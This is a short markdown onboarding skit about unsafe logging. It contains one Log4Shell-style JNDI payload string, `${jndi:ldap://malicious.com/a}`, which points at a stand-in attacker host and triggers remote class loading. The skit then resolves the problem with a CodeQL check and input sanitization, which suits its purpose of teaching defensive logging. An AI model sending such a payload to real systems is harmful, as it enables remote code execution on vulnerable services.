# 🎬 Skit: The Curious Logger

## 🎭 Scene Setup
Engineer logs user input using `logger.info(userInput)`.

## ⚔️ Conflict
User input contains `${jndi:ldap://malicious.com/a}`, triggering remote class loading.

## 🛠️ Resolution
- CodeQL query flags unsafe logging
- Fix includes input sanitization
- Artifact: teachback.md + SOP + skit script

## 🧠 Teaching Moment
This skit dramatizes how a simple log statement can become an exploit vector. It’s used in onboarding to teach exploit-aware logging practices.
